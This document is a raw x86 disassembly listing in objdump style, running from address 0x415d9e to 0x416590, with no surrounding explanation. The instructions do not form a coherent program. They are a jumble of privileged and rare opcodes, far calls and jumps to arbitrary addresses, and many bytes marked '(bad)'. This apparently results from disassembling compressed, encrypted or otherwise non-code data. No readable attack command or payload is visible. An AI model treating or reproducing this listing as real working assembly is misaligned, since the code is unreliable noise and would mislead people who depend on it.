  415d9e:	icebp  
  415d9f:	xor    esp,esi
  415da1:	adc    eax,0x9ced2c5c
  415da6:	mov    ah,0x25
  415da8:	cwde   
  415da9:	push   edx
  415daa:	pop    es
  415dab:	dec    ebp
  415dac:	mov    dl,BYTE PTR [eax]
  415dae:	fwait
  415daf:	adc    BYTE PTR [esi+0x3f3a88c0],bh
  415db5:	ja     0x415e0b
  415db7:	jo     0x415e2a
  415db9:	sbb    ah,bl
  415dbb:	dec    esp
  415dbc:	inc    edi
  415dbd:	inc    esp
  415dbe:	push   edi
  415dbf:	lods   al,BYTE PTR ds:[esi]
  415dc0:	add    BYTE PTR [ebp-0x25],bh
  415dc3:	xor    eax,0xdb192320
  415dc8:	out    0xd6,al
  415dca:	inc    edi
  415dcb:	enter  0x5c9a,0x8d
  415dcf:	lds    edi,FWORD PTR [edx-0x78]
  415dd2:	sar    BYTE PTR [eax+0x251d0154],cl
  415dd8:	mov    dh,0xd0
  415dda:	mov    ch,ah
  415ddc:	fidivr DWORD PTR [ebp+0x65]
  415ddf:	int3   
  415de0:	fistp  DWORD PTR [ebx+0x220abfab]
  415de6:	jge    0x53d99619
  415dec:	(bad)  
  415ded:	fs retf 
  415def:	hlt    
  415df0:	lods   eax,DWORD PTR ds:[esi]
  415df1:	daa    
  415df2:	rcr    DWORD PTR [esi+0x6164bf46],cl
  415df8:	out    0xc9,al
  415dfa:	popa   
  415dfb:	push   edi
  415dfc:	hlt    
  415dfd:	dec    ecx
  415dfe:	(bad)  
  415dff:	in     eax,0xf1
  415e01:	push   ebx
  415e02:	les    esi,FWORD PTR [edi+0x7]
  415e05:	adc    BYTE PTR [eax-0x131bbba9],ch
  415e0b:	and    eax,0xbe02059
  415e10:	mov    edi,0x2ea84b43
  415e15:	lock jnp 0x415da2
  415e18:	push   esi
  415e19:	adc    eax,0xc005fabf
  415e1e:	or     BYTE PTR [eax],cl
  415e20:	ss icebp 
  415e22:	jbe    0x415e3f
  415e24:	pop    DWORD PTR [eax-0x2a]
  415e27:	into   
  415e28:	mov    eax,0xe26b59a2
  415e2d:	push   eax
  415e2e:	imul   eax,ecx,0x39
  415e31:	ss pop ds
  415e33:	or     eax,0x27345be0
  415e38:	mov    ds:0x45fa6a8b,eax
  415e3d:	fidivr WORD PTR [eax-0x669a9687]
  415e43:	mov    esi,DWORD PTR [esi]
  415e45:	and    cl,dl
  415e47:	xchg   ebx,eax
  415e48:	xlat   BYTE PTR ds:[ebx]
  415e49:	sbb    ch,BYTE PTR [edi+0x42bec1e3]
  415e4f:	test   al,0x5e
  415e51:	shl    BYTE PTR [edx+ebx*8],0xbf
  415e55:	add    al,0x44
  415e57:	xor    eax,0xa2fd69a2
  415e5c:	aad    0xc
  415e5e:	xchg   ecx,eax
  415e5f:	inc    esp
  415e60:	sub    BYTE PTR [esi+0x2e],bl
  415e63:	loop   0x415eac
  415e65:	aas    
  415e66:	shr    DWORD PTR ds:0xd5a8d829,0x2a
  415e6d:	pop    es
  415e6e:	pop    DWORD PTR [eax-0x1e]
  415e71:	pop    ebx
  415e72:	call   0xfa77:0x390e0d62
  415e79:	xor    esp,DWORD PTR [ebx-0x41]
  415e7c:	sahf   
  415e7d:	and    cl,BYTE PTR [ecx-0x4784d7bd]
  415e83:	and    eax,0x6264d900
  415e88:	jne    0x415e2d
  415e8a:	jb     0x415ed6
  415e8c:	sbb    DWORD PTR [edx+0x23],0x99c3c3d2
  415e93:	adc    BYTE PTR [ecx],cl
  415e95:	jg     0x415ebc
  415e97:	jl     0x415e47
  415e99:	rol    DWORD PTR [eax-0x6ecf2d9f],1
  415e9f:	stos   DWORD PTR es:[edi],eax
  415ea0:	mov    ebp,0x86bdf317
  415ea5:	cmc    
  415ea6:	and    DWORD PTR [ecx+0xc],0x2d093ef3
  415ead:	in     al,0x56
  415eaf:	push   0xffffffc7
  415eb1:	pop    ebx
  415eb2:	sbb    dl,dl
  415eb4:	popa   
  415eb5:	jno    0x612759dc
  415ebb:	loope  0x415efb
  415ebd:	xor    al,0x4f
  415ebf:	sbb    BYTE PTR [ecx],ah
  415ec1:	aaa    
  415ec2:	xor    eax,0x806420d8
  415ec7:	outs   dx,BYTE PTR ds:[esi]
  415ec8:	test   BYTE PTR [edi+0x39ba13cc],al
  415ece:	repnz add DWORD PTR [edx+0x54939cdf],0x4
  415ed6:	fadd   DWORD PTR [edi-0x2c]
  415ed9:	jl     0x415ec9
  415edb:	test   al,0x9b
  415edd:	inc    esp
  415ede:	ret    0x7ab3
  415ee1:	mov    bl,0x88
  415ee3:	scas   al,BYTE PTR es:[edi]
  415ee4:	fsub   DWORD PTR [edx+0x63]
  415ee7:	add    BYTE PTR [ecx*1-0x35b55e69],bh
  415eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eef:	push   0x2f2a0be4
  415ef4:	je     0x415f39
  415ef6:	loop   0x415f45
  415ef8:	mov    eax,0x64861b12
  415efd:	ja     0x415ebc
  415eff:	cs lock test eax,0xc70d51f9
  415f06:	cmp    eax,0x92b872a8
  415f0b:	inc    esp
  415f0c:	fldcw  WORD PTR [edx]
  415f0e:	inc    edx
  415f0f:	inc    ebx
  415f10:	(bad)  
  415f12:	aad    0xa3
  415f14:	inc    esp
  415f16:	pop    edx
  415f17:	mov    BYTE PTR [ecx+edx*2-0x14472e4b],bh
  415f1e:	cmp    BYTE PTR [esi-0x16bed05],0x10
  415f25:	aaa    
  415f26:	shr    bh,cl
  415f28:	mov    esp,0x99e100e8
  415f2d:	arpl   ax,cx
  415f2f:	push   0xffffffa0
  415f31:	jle    0x415f88
  415f33:	call   0xdda2:0xc0e1760
  415f3a:	jae    0x415f01
  415f3c:	lods   al,BYTE PTR ds:[esi]
  415f3d:	je     0x415f16
  415f3f:	pop    es
  415f40:	stos   BYTE PTR es:[edi],al
  415f41:	mov    ds:0x63a3cd77,al
  415f46:	mov    DWORD PTR ds:0x1f0aab3e,edi
  415f4c:	cmp    eax,0x504a3149
  415f51:	inc    BYTE PTR [ebx+edx*4+0x471fa709]
  415f58:	cmp    eax,0xda0819e8
  415f5d:	rcl    BYTE PTR [edx+ebp*2+0x0],1
  415f61:	dec    esp
  415f62:	pop    esi
  415f63:	ins    BYTE PTR es:[edi],dx
  415f64:	push   esp
  415f65:	push   ebp
  415f66:	scas   eax,DWORD PTR es:[edi]
  415f67:	add    BYTE PTR [esi-0x35],0xb
  415f6b:	push   cs
  415f6c:	pop    ds
  415f6d:	push   ecx
  415f6e:	int    0x3
  415f70:	je     0x415f7a
  415f72:	test   DWORD PTR [ebx-0xe758864],0x53be9a68
  415f7c:	out    dx,eax
  415f7d:	mov    WORD PTR [ecx-0x16],?
  415f80:	aam    0xeb
  415f82:	arpl   WORD PTR [ecx+0x15eb3d3e],cx
  415f88:	cmc    
  415f89:	adc    bh,ah
  415f8b:	mov    ah,0xda
  415f8d:	fiadd  DWORD PTR [ebp+0x66]
  415f90:	(bad)  [edi-0x3d]
  415f93:	pop    ss
  415f94:	mov    eax,0xb2098c54
  415f99:	adc    dl,BYTE PTR [eax]
  415f9b:	fsubr  QWORD PTR ds:0x9976c414
  415fa1:	or     DWORD PTR [ecx+0x75a3ecf9],edx
  415fa7:	add    ch,ah
  415fa9:	aaa    
  415faa:	in     al,0x8b
  415fac:	scas   eax,DWORD PTR es:[edi]
  415fad:	je     0x416018
  415faf:	jge    0x415f4a
  415fb1:	test   BYTE PTR [ebp-0x56fe2c19],0xec
  415fb8:	pusha  
  415fb9:	mov    dl,0x4f
  415fbb:	cmc    
  415fbc:	sub    ch,ah
  415fbe:	int3   
  415fbf:	sub    bl,0xab
  415fc2:	mov    dl,0xc4
  415fc4:	pop    esi
  415fc5:	or     al,0xc1
  415fc7:	retf   0x18d8
  415fca:	fisttp WORD PTR [ebp+0x9911764]
  415fd0:	rcr    DWORD PTR [ebp+0x76cab7f3],cl
  415fd6:	or     DWORD PTR [esi],esi
  415fd8:	(bad)  
  415fd9:	iret   
  415fda:	push   0x167db026
  415fdf:	mov    es,edi
  415fe1:	fisttp WORD PTR [ebp-0x3e]
  415fe4:	pop    ebx
  415fe5:	out    0x8e,eax
  415fe7:	pop    edi
  415fe8:	pop    esi
  415fe9:	scas   al,BYTE PTR es:[edi]
  415fea:	dec    esp
  415feb:	adc    eax,0x6cba06eb
  415ff0:	jle    0x415ffe
  415ff2:	jmp    0x3c5e5319
  415ff7:	push   0x7b30f5c1
  415ffc:	jne    0x41602b
  415ffe:	adc    ecx,ebx
  416000:	aam    0xbc
  416002:	sub    eax,0x69a53002
  416007:	rcr    al,0xc5
  41600a:	jb     0x415ffc
  41600c:	inc    edx
  41600d:	jmp    0x594e:0x749c35c5
  416014:	das    
  416015:	imul   edx,DWORD PTR [ebx],0x60
  416018:	mov    dh,0xe9
  41601a:	repnz inc esp
  41601c:	cs jb  0x416010
  41601f:	mov    eax,ds:0x3054843f
  416024:	shl    ebp,1
  416026:	jp     0x416028
  416028:	test   eax,0xf479abc4
  41602d:	or     DWORD PTR [edx],edx
  41602f:	inc    ecx
  416030:	fild   QWORD PTR [edx-0x2b]
  416034:	std    
  416035:	mov    bh,0x3a
  416037:	sbb    eax,DWORD PTR [edi-0x54cb7640]
  41603d:	jae    0x416009
  41603f:	xor    eax,0x10d9dce0
  416044:	jg     0x416056
  416046:	inc    eax
  416047:	dec    DWORD PTR [eax]
  416049:	sbb    al,0xd3
  41604b:	scas   al,BYTE PTR es:[edi]
  41604c:	test   al,0x8
  41604e:	fcom   QWORD PTR [ebp+0x3d]
  416051:	xchg   ebx,eax
  416052:	xchg   esi,eax
  416053:	std    
  416054:	mov    dh,0xa1
  416056:	shl    BYTE PTR [edx+ecx*8+0x18],0x65
  41605b:	js     0x41609f
  41605d:	dec    edx
  41605e:	xor    ebp,ebp
  416060:	cld    
  416061:	bound  edi,QWORD PTR [eax+0x21abbf8a]
  416067:	mov    ds:0xa998f043,al
  41606c:	or     BYTE PTR [eax+esi*1+0x25],dl
  416070:	mov    cl,0x26
  416072:	sbb    ah,al
  416074:	push   edx
  416075:	addr16 pusha 
  416077:	je     0x4160e8
  416079:	xchg   ecx,eax
  41607a:	jno    0x416099
  41607c:	stos   DWORD PTR es:[edi],eax
  41607d:	cdq    
  41607e:	pushf  
  41607f:	mov    dh,0x72
  416081:	add    al,0xfa
  416083:	push   edi
  416084:	out    0xc7,al
  416086:	(bad)  
  416087:	clc    
  416088:	jecxz  0x416104
  41608a:	sbb    ecx,DWORD PTR [esp+edi*2+0x1a]
  41608e:	push   0x323761c8
  416093:	sbb    al,0xf8
  416095:	and    al,0x8
  416097:	fs jg  0x41602c
  41609a:	push   esp
  41609b:	push   es
  41609c:	iret   
  41609d:	gs pusha 
  41609f:	pop    esi
  4160a0:	dec    edx
  4160a1:	mul    BYTE PTR [edi]
  4160a3:	jne    0x4160e3
  4160a5:	dec    eax
  4160a6:	add    eax,0x44545045
  4160ab:	add    ebx,DWORD PTR [ebx+0x10]
  4160ae:	push   es
  4160af:	and    esi,DWORD PTR [eax]
  4160b1:	clc    
  4160b2:	cmp    al,0xe4
  4160b4:	push   ss
  4160b5:	nop
  4160b6:	push   edi
  4160b7:	push   cs
  4160b8:	xchg   BYTE PTR [ebp+0x111ea27],dl
  4160be:	mov    ah,0x86
  4160c0:	into   
  4160c1:	xor    edx,ebx
  4160c3:	sub    DWORD PTR [edx+edx*1-0x60],ecx
  4160c7:	ins    BYTE PTR es:[edi],dx
  4160c8:	(bad)  
  4160c9:	sbb    esp,DWORD PTR ds:0x35f1e489
  4160cf:	sahf   
  4160d0:	push   esi
  4160d1:	mov    ebx,0xb78e543b
  4160d6:	mov    cs,WORD PTR [ebp-0x74]
  4160d9:	dec    ecx
  4160da:	adc    ebx,DWORD PTR [ecx]
  4160dc:	imul   esp,DWORD PTR [edx-0x21fbca20],0x85d4bc01
  4160e6:	pop    esp
  4160e7:	cli    
  4160e8:	inc    ebx
  4160e9:	imul   edi,DWORD PTR [ebp+0x2a],0xa1a5a8b3
  4160f0:	(bad)  
  4160f1:	in     eax,dx
  4160f2:	xor    DWORD PTR [esi],ebx
  4160f4:	xor    BYTE PTR [ebx],0x57
  4160f7:	push   ecx
  4160f8:	adc    al,0x68
  4160fa:	pop    ss
  4160fb:	push   edx
  4160fc:	cli    
  4160fd:	pop    ecx
  4160fe:	jg     0x41616d
  416100:	arpl   ax,cx
  416102:	jl     0x416106
  416104:	mov    edi,0xd1d83db
  416109:	xor    ah,BYTE PTR [ebx]
  41610b:	addr16 cwde 
  41610d:	pop    esi
  41610e:	call   0x1c3f:0x58ccd803
  416115:	mov    ds:0x3da8ab5e,al
  41611a:	xor    eax,0xf6a822a0
  41611f:	pop    edi
  416120:	jne    0x4160d1
  416122:	xchg   BYTE PTR [edx+0x3f73faa5],dl
  416128:	rol    BYTE PTR [esi-0x19deb50c],0x3b
  41612f:	int3   
  416130:	(bad)  
  416131:	nop
  416132:	xchg   edi,eax
  416133:	ins    BYTE PTR es:[edi],dx
  416134:	xor    eax,0xaad13679
  416139:	test   BYTE PTR [edx+0x62a39ba3],dh
  41613f:	jp     0x41611a
  416141:	adc    edi,ecx
  416143:	rol    DWORD PTR [ebp-0x3e],1
  416146:	mov    al,0x24
  416148:	pop    ebx
  416149:	cmovp  esi,esi
  41614c:	rep lods eax,DWORD PTR ds:[esi]
  41614e:	ret    
  41614f:	nop
  416150:	jp     0x4161c7
  416152:	jno    0x416143
  416154:	mov    ebp,0x71b2930d
  416159:	sub    ebx,DWORD PTR [eax-0x21]
  41615c:	and    BYTE PTR [eax+0x18],ch
  41615f:	pusha  
  416160:	push   ebp
  416161:	push   cs
  416162:	pop    ebp
  416163:	(bad)  
  416165:	jp     0x4161cd
  416167:	enter  0xd7b3,0xbe
  41616b:	and    bl,dl
  41616d:	inc    esp
  41616e:	jnp    0x41616e
  416170:	aad    0x3f
  416172:	pop    esp
  416173:	push   ebx
  416174:	mov    ds:0xb60f9ffc,al
  416179:	in     eax,0x6a
  41617b:	fst    QWORD PTR [ebp-0x17]
  41617e:	cmp    dl,ch
  416180:	push   edx
  416181:	shl    ebp,cl
  416183:	add    al,0xb9
  416185:	frstor [esi]
  416187:	icebp  
  416188:	iret   
  416189:	fld    TBYTE PTR [edx-0x47d41942]
  41618f:	leave  
  416190:	pusha  
  416191:	sub    ah,BYTE PTR [ebx]
  416193:	jl     0x416128
  416195:	cmc    
  416196:	inc    ebp
  416197:	and    ch,BYTE PTR [ebp+0xb0c623a]
  41619d:	data16 adc cl,al
  4161a0:	fnstsw WORD PTR [eax-0x43]
  4161a3:	xchg   esp,eax
  4161a4:	xrelease xchg BYTE PTR fs:[edx-0x6e342a4f],dh
  4161ac:	test   edx,edx
  4161ae:	mov    esi,0x404cfea0
  4161b3:	mov    esi,0xfcd99ee
  4161b8:	push   cs
  4161b9:	mov    esp,0x53d0825
  4161be:	dec    edi
  4161bf:	ficomp DWORD PTR [edi-0x7eeedb99]
  4161c5:	cmp    DWORD PTR [ebx],0x3023c9bd
  4161cb:	jge    0x4161cd
  4161cd:	lock ins DWORD PTR es:[edi],dx
  4161cf:	xchg   edi,eax
  4161d0:	fst    QWORD PTR [ecx]
  4161d2:	pop    ss
  4161d3:	cmp    edi,esp
  4161d5:	aas    
  4161d6:	jecxz  0x4161de
  4161d8:	jns    0x4161db
  4161da:	cli    
  4161db:	mov    ecx,0x6e5e0522
  4161e0:	adc    eax,esp
  4161e2:	mov    ebp,0x36c8a824
  4161e7:	leave  
  4161e8:	fld    QWORD PTR [edi+0x46edb45b]
  4161ee:	jne    0x41623e
  4161f0:	xchg   ebx,eax
  4161f1:	mov    bl,0x6f
  4161f3:	rep stos DWORD PTR es:[edi],eax
  4161f5:	xlat   BYTE PTR ds:[ebx]
  4161f6:	push   0x968e6e1d
  4161fb:	test   DWORD PTR [eax+0x2c],ecx
  4161fe:	(bad)  
  4161ff:	cmp    esp,DWORD PTR [eax+ebp*4-0x21]
  416203:	cli    
  416204:	inc    eax
  416205:	aaa    
  416206:	jo     0x4161d7
  416208:	in     eax,dx
  416209:	and    eax,DWORD PTR [ebx+0x47]
  41620c:	sub    edi,DWORD PTR [bx+si+0x44]
  416210:	out    0x87,eax
  416212:	retf   0x412a
  416215:	pop    edx
  416217:	cli    
  416218:	and    bl,al
  41621a:	xchg   esp,eax
  41621b:	adc    DWORD PTR [ecx+0x123bbeb7],esi
  416221:	dec    ecx
  416222:	adc    al,0xe3
  416224:	inc    ebp
  416225:	xor    al,0xe7
  416227:	sbb    eax,0x398fad7c
  41622c:	rcl    BYTE PTR [edi+esi*8-0x7ff55d06],1
  416233:	retf   0x6308
  416236:	repnz ss loopne 0x416259
  41623a:	add    al,0xfe
  41623c:	xchg   DWORD PTR [edi-0x65],edi
  41623f:	mov    esp,cs
  416241:	and    al,0x26
  416243:	imul   esi,DWORD PTR [eax-0x45],0xa7303ce
  41624a:	mov    fs,WORD PTR [ecx+0x4d]
  41624d:	push   ss
  41624e:	xlat   BYTE PTR ds:[ebx]
  41624f:	sub    ecx,DWORD PTR [eax+0x6e]
  416252:	sbb    al,0xaf
  416254:	cmp    al,0xfb
  416256:	pop    ss
  416257:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416258:	add    eax,0x3a20df1b
  41625d:	jne    0x4162c9
  41625f:	and    eax,0xf84df7f9
  416264:	gs lock push 0x4c72291
  41626b:	mov    ecx,0x5e350738
  416270:	ins    DWORD PTR es:[edi],dx
  416271:	data16 lods al,BYTE PTR ds:[esi]
  416273:	push   ss
  416274:	les    edi,FWORD PTR cs:[ebp-0x7]
  416278:	xor    eax,0xb8a49a09
  41627d:	mov    ebx,0x4ecdd0d7
  416282:	mov    edi,0x20e16d43
  416287:	adc    al,0xd1
  416289:	ss test eax,0xd9cb9c80
  41628f:	push   esi
  416290:	jne    0x416263
  416292:	out    0x4e,eax
  416294:	(bad)  
  416295:	jo     0x4162e1
  416297:	psubusw mm3,QWORD PTR [ecx+ebx*1]
  41629b:	and    ecx,DWORD PTR [edi]
  41629d:	xchg   edi,eax
  41629e:	sbb    esp,DWORD PTR [ebx]
  4162a0:	lods   eax,DWORD PTR ds:[esi]
  4162a1:	push   edx
  4162a2:	mov    esp,0x5c2f7f61
  4162a7:	sub    DWORD PTR [ebp+0x5c],ecx
  4162aa:	out    dx,eax
  4162ab:	sub    edi,DWORD PTR [ebx+0x716408b0]
  4162b1:	jmp    0x4162ef
  4162b3:	push   ebp
  4162b4:	ror    DWORD PTR [edi-0x5b92940e],0x8b
  4162bb:	xor    DWORD PTR [esi+0x43],ecx
  4162be:	mov    eax,ds:0x5246f99e
  4162c3:	dec    eax
  4162c4:	leave  
  4162c5:	(bad)  
  4162c6:	xchg   ebx,eax
  4162c7:	inc    eax
  4162c8:	sbb    ah,0x22
  4162cb:	ret    
  4162cc:	scas   al,BYTE PTR es:[edi]
  4162cd:	aaa    
  4162ce:	cmc    
  4162cf:	sbb    BYTE PTR [edx],ch
  4162d1:	sbb    dh,bh
  4162d3:	jl     0x4162b6
  4162d5:	pop    ebx
  4162d6:	inc    edi
  4162d7:	idiv   DWORD PTR [ecx]
  4162d9:	js     0x41625b
  4162db:	std    
  4162dc:	cmc    
  4162dd:	sbb    BYTE PTR cs:[esi-0x5ef5dd3c],ch
  4162e4:	lock pop ss
  4162e6:	pop    edi
  4162e7:	repz sti 
  4162e9:	push   cs
  4162ea:	retf   0x1221
  4162ed:	adc    al,0xac
  4162ef:	aaa    
  4162f0:	jl     0x41632e
  4162f2:	sub    esi,DWORD PTR [ebp-0x71ac7396]
  4162f8:	and    al,0x4e
  4162fa:	sar    BYTE PTR [esi],cl
  4162fc:	xchg   BYTE PTR [esi],bh
  4162fe:	(bad)  
  4162ff:	push   esp
  416300:	loop   0x4162b6
  416302:	int    0x74
  416304:	(bad)  
  416305:	add    ecx,DWORD PTR [esi+0xa]
  416308:	lea    ebp,[ecx+0x25c198fe]
  41630e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41630f:	nop
  416310:	fstp   QWORD PTR [ebx-0x21b97f1d]
  416316:	ds inc esi
  416318:	mov    esp,0x9d346e6d
  41631d:	fwait
  41631e:	js     0x4162d3
  416320:	out    0xb1,al
  416322:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416323:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416324:	add    DWORD PTR [edi+0x72fba7a8],edi
  41632a:	pushf  
  41632b:	shr    BYTE PTR [eax],1
  41632d:	push   cs
  41632e:	xchg   ebp,eax
  41632f:	pop    es
  416330:	sbb    ah,ah
  416332:	mov    WORD PTR [ebx-0x57e5a307],fs
  416338:	mov    dh,0xca
  41633a:	xor    ebp,DWORD PTR ds:0x3c55a65e
  416340:	mov    al,0x7b
  416342:	jecxz  0x41635c
  416344:	pop    edi
  416345:	sbb    al,0xcf
  416347:	rcl    bh,0x13
  41634a:	retf   
  41634b:	cli    
  41634c:	inc    DWORD PTR [ecx]
  41634e:	mov    BYTE PTR [ebp+0x12],0x2f
  416352:	and    BYTE PTR [ecx-0x63],bh
  416355:	xor    DWORD PTR [edi-0x1225791f],esi
  41635b:	sbb    ecx,DWORD PTR [ebp-0xcf2839]
  416361:	sub    dh,BYTE PTR [edi]
  416363:	sti    
  416364:	mov    es,WORD PTR [ebp+0x6a]
  416367:	jecxz  0x4162f0
  416369:	push   ebx
  41636a:	in     eax,dx
  41636b:	repz call 0xc3a6:0xfa96654c
  416373:	cmp    al,0x58
  416375:	scas   eax,DWORD PTR es:[edi]
  416376:	push   edx
  416377:	and    bl,BYTE PTR [ebx-0x1e]
  41637a:	clc    
  41637b:	inc    edx
  41637c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41637d:	ficom  DWORD PTR [edx-0x550990c5]
  416383:	and    DWORD PTR [edi+ecx*1],eax
  416386:	mov    cs,WORD PTR [edx]
  416388:	pop    esp
  416389:	retf   
  41638a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41638b:	ins    BYTE PTR es:[edi],dx
  41638c:	jp     0x416395
  41638e:	dec    esi
  41638f:	jg     0x4163e4
  416391:	leave  
  416392:	xor    bl,ch
  416394:	push   edi
  416395:	jae    0x4163ae
  416397:	mov    ebp,0xe3ac683e
  41639c:	enter  0x7526,0x55
  4163a0:	dec    esp
  4163a1:	and    ah,ah
  4163a3:	fisubr DWORD PTR [ebp+0x61]
  4163a6:	shr    BYTE PTR [ebx-0x6b5f9334],cl
  4163ac:	pusha  
  4163ad:	shr    DWORD PTR [esi],cl
  4163af:	loope  0x4163df
  4163b1:	fstp   TBYTE PTR [esi+0x6e]
  4163b4:	gs enter 0xe46e,0x71
  4163b9:	lock rcr DWORD PTR [ebx+0x79],cl
  4163bd:	je     0x4163a6
  4163bf:	mov    ?,esp
  4163c1:	jae    0x41635c
  4163c3:	mov    eax,0x39f06893
  4163c8:	outs   dx,DWORD PTR ds:[esi]
  4163c9:	fs data16 mov ch,0xc1
  4163cd:	push   esp
  4163ce:	test   al,ch
  4163d0:	add    DWORD PTR [edx+0x76],esp
  4163d3:	ss pop edx
  4163d5:	loopne 0x416387
  4163d7:	mov    bh,0x44
  4163d9:	std    
  4163da:	push   0x14cfa6d0
  4163df:	sbb    DWORD PTR [edx+0x31],eax
  4163e2:	inc    eax
  4163e3:	inc    ecx
  4163e4:	into   
  4163e5:	and    al,0x46
  4163e7:	dec    esi
  4163e8:	jbe    0x41641f
  4163ea:	ins    BYTE PTR es:[edi],dx
  4163eb:	inc    edx
  4163ec:	mov    esi,0xbb99a197
  4163f1:	xchg   esi,eax
  4163f2:	fwait
  4163f3:	jmp    0x4ad7592e
  4163f8:	ret    0xbebe
  4163fb:	adc    eax,ecx
  4163fd:	sbb    BYTE PTR [eax],bl
  4163ff:	mov    ecx,DWORD PTR [ecx-0x58]
  416402:	fcomp  QWORD PTR [esi+eiz*2]
  416405:	mov    bh,0xd8
  416407:	jg     0x4163b2
  416409:	aad    0x5d
  41640b:	sub    bl,dh
  41640d:	mov    esp,0x6fdecdae
  416412:	mov    WORD PTR [edi-0x7f7ec51f],gs
  416418:	pop    edi
  416419:	std    
  41641a:	xchg   ecx,eax
  41641b:	das    
  41641c:	inc    ecx
  41641d:	mov    ?,esp
  41641f:	jae    0x4163cb
  416421:	shr    DWORD PTR [ebp-0x58],1
  416424:	xchg   edi,eax
  416425:	mov    cl,0xdd
  416427:	imul   edi
  416429:	push   ebp
  41642a:	push   0xa06b7f37
  41642f:	inc    ecx
  416430:	push   ss
  416431:	sbb    ecx,DWORD PTR [ebx+0x407cfb22]
  416437:	push   esi
  416438:	jg     0x4163de
  41643a:	neg    DWORD PTR [ebp+0x1951d518]
  416440:	adc    al,0x9a
  416442:	cdq    
  416443:	cwde   
  416444:	mov    WORD PTR [eax-0x75],cs
  416447:	test   eax,0xc9140200
  41644c:	xchg   ecx,eax
  41644d:	xchg   ebp,eax
  41644e:	jbe    0x4164c1
  416450:	xor    DWORD PTR [edi+0x78],ebp
  416453:	aas    
  416454:	and    eax,0x44ad46de
  416459:	xchg   edx,eax
  41645a:	mov    dh,0x40
  41645c:	dec    ebp
  41645d:	ja     0x416476
  41645f:	int    0x86
  416461:	retf   0xb4d0
  416464:	inc    eax
  416465:	ja     0x416463
  416467:	std    
  416468:	loope  0x41640d
  41646a:	enter  0x3322,0xdd
  41646e:	mov    dl,0xc0
  416470:	sub    al,0x2f
  416472:	jbe    0x41648a
  416474:	xlat   BYTE PTR ds:[ebx]
  416475:	popa   
  416476:	dec    edx
  416477:	pop    ds
  416478:	stos   BYTE PTR es:[edi],al
  416479:	cmp    dl,cl
  41647b:	xchg   esi,eax
  41647c:	and    al,BYTE PTR [edi-0x61]
  41647f:	in     al,0x1f
  416481:	or     dh,al
  416483:	push   es
  416484:	dec    eax
  416485:	ds sbb eax,0xd40877b4
  41648b:	stos   BYTE PTR es:[edi],al
  41648c:	push   es
  41648d:	cli    
  41648e:	sbb    DWORD PTR [eax],ebp
  416490:	test   DWORD PTR [eax],eax
  416492:	sbb    BYTE PTR [ebx],bh
  416494:	stos   BYTE PTR es:[edi],al
  416495:	jle    0x416473
  416497:	xor    eax,0x63218fc0
  41649c:	xchg   ebp,eax
  41649d:	sahf   
  41649e:	fcom   DWORD PTR [ebx+0x3f]
  4164a1:	and    edx,DWORD PTR ss:[ebp-0x62ef0df4]
  4164a8:	and    DWORD PTR ds:0x8116d6a8,0x23
  4164af:	pop    es
  4164b0:	adc    BYTE PTR [edi-0x1e2a6aee],bl
  4164b6:	int    0xc8
  4164b8:	mov    dh,bl
  4164ba:	ror    DWORD PTR [ecx],1
  4164bc:	mov    dl,0xb6
  4164be:	fdivr  DWORD PTR [ebp-0x4e]
  4164c1:	sub    ch,ah
  4164c3:	in     eax,0x65
  4164c5:	jne    0x4164c4
  4164c7:	pop    edi
  4164c8:	shr    DWORD PTR [esi],0x16
  4164cb:	mov    ch,0xc5
  4164cd:	lds    ebp,FWORD PTR [ecx-0x42]
  4164d0:	in     al,dx
  4164d1:	repz sbb al,BYTE PTR [bx+di+0x2ab6]
  4164d7:	push   cs
  4164d8:	add    bh,BYTE PTR [eax+eax*1+0x74665f5b]
  4164df:	jl     0x4164d2
  4164e1:	jecxz  0x41650a
  4164e3:	push   ebx
  4164e4:	and    bl,BYTE PTR [esi]
  4164e6:	je     0x416515
  4164e8:	test   al,0x1c
  4164ea:	and    ebp,ebx
  4164ec:	inc    edx
  4164ed:	mov    ds:0x4096233f,eax
  4164f2:	xchg   edx,eax
  4164f3:	sub    bh,BYTE PTR ds:0x17e5557e
  4164fa:	bound  esi,QWORD PTR [ebx+0x3f]
  4164fd:	xchg   BYTE PTR [edx-0x3eed51ca],bh
  416503:	adc    eax,0x14b84a7
  416508:	cli    
  416509:	pop    ebp
  41650a:	shl    DWORD PTR [eax-0x12faa63e],cl
  416510:	dec    edi
  416511:	clc    
  416512:	cwde   
  416513:	mov    ebx,0x7bbc4984
  416518:	fld    DWORD PTR [esi]
  41651a:	pop    ebp
  41651b:	jmp    0x6dfec1f7
  416520:	xor    dh,al
  416522:	ret    
  416523:	or     esi,DWORD PTR [ebx-0x72278783]
  416529:	(bad)  
  41652a:	(bad)  
  41652b:	jmp    0x416509
  41652d:	sub    BYTE PTR [ebx],bh
  41652f:	xchg   ebx,eax
  416530:	cld    
  416531:	fwait
  416532:	ds mov dl,0x58
  416535:	dec    esi
  416536:	jo     0x4165a2
  416538:	push   ds
  416539:	ins    DWORD PTR es:[edi],dx
  41653a:	clc    
  41653b:	callw  0xd3f5
  41653f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416540:	call   0x97ac:0x85aa82cf
  416547:	sbb    eax,eax
  416549:	xor    ecx,edi
  41654b:	xor    ah,BYTE PTR [ebp+0x68]
  41654e:	fcmovbe st,st(6)
  416550:	loop   0x4164ee
  416552:	aad    0x68
  416554:	or     al,0x1f
  416556:	jmp    DWORD PTR [esi+0x2b0d865a]
  41655c:	rcr    ecx,cl
  41655e:	arpl   bp,di
  416560:	push   cs
  416561:	adc    eax,0xfba3768d
  416566:	pop    esp
  416567:	out    0xb,al
  416569:	fisttp DWORD PTR [edx+0x22]
  41656c:	scas   eax,DWORD PTR es:[edi]
  41656d:	mov    ds:0xbc244e2a,eax
  416572:	out    0xf3,eax
  416574:	into   
  416575:	push   esp
  416576:	test   al,0x78
  416578:	fcom   st(3)
  41657a:	sbb    eax,0xe5b4cd79
  41657f:	or     al,0xe3
  416581:	or     ebp,DWORD PTR [edi+edi*8]
  416584:	unpckhps xmm2,XMMWORD PTR [ecx+0x138817f4]
  41658b:	mov    dl,0x69
  41658d:	shl    DWORD PTR [edi],0x65
  416590:	(bad)  
